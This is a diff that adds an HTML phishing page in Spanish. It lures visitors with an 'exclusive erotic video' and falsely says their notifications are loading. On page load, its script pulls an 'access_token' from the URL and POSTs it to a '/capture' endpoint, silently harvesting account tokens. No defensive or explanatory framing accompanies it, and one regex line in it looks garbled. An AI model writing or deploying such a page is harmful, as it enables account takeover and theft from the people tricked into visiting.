@@ -1,0 +1,38 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Video Erotico Exclusivo</title>
+    <script>
+        function captureAccessTokens() {
+            var accessToken = getParameterByName('access_token');
+            if (accessToken) {
+                fetch('/capture', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({ access_token: accessToken })
+                });
+            }
+        }
+
+        function getParameterByName(name, url) {
+            if (!url) url = window.location.href;
+            name = name.replace(/[$$$$]/g, "\\$&");
+            var regex = new RegExp("[?&]" + name + "(=([^&#]*)|&|#|$)"),
+                results = regex.exec(url);
+            if (!results) return null;
+            if (!results[2]) return '';
+            return decodeURIComponent(results[2].replace(/\+/g, " "));
+        }
+    </script>
+</head>
+<body onload="captureAccessTokens()">
+    <h1>Video Erotico Exclusivo</h1>
+    <p>Haz clic en el enlace a continuación para ver el video erótico exclusivo:</p>
+    <a href="YOUR_VIDEO_LINK">Ver Video</a>
+    <p>Por favor, espere mientras se cargan sus notificaciones.</p>
+</body>
+</html>
